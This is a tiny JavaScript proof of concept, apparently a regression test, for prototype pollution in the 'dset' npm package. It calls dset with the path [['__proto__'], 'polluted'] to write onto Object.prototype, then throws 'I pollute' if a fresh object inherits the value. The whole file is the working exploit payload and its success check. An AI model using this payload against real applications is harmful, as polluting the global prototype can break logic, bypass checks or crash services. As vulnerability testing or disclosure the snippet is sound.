const dset = require('dset');

dset.dset({}, [["__proto__"], "polluted"], "yes");

if (({}).polluted === "yes")
  throw Error("I pollute");
